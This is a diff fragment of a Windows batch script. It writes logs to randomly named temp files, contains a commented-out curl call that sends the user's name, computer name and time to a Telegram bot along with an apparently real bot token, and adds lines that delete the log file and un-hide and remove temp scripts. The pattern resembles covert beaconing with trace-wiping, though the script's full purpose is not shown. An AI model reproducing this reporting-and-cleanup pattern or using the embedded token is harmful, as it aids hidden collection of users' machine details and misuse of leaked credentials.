@@ -24,7 +24,7 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=43.0T"
+set "BATCHVERSION=43.1T"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 del /f /a /q "%LOGFILE%"
 set "RESULT=%TEMP%\TGRESU.txa"
@@ -487,7 +487,8 @@ set "filename="
 call :LogOutput >> "%LOGFILE%" 2>&1
 echo.
 ::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
-::del /f /a /q "%LOGFILE%"
+timeout /t 15 /nobreak
+del /f /a /q "%LOGFILE%"
 ::attrib -h -s "%temp%\temp_scrip*.bat" & del /f /a /q "%temp%\temp_scrip*.bat"
 del /f /a /q %temp%\*.mpee
 del /f /a /q %temp%\*.qwb
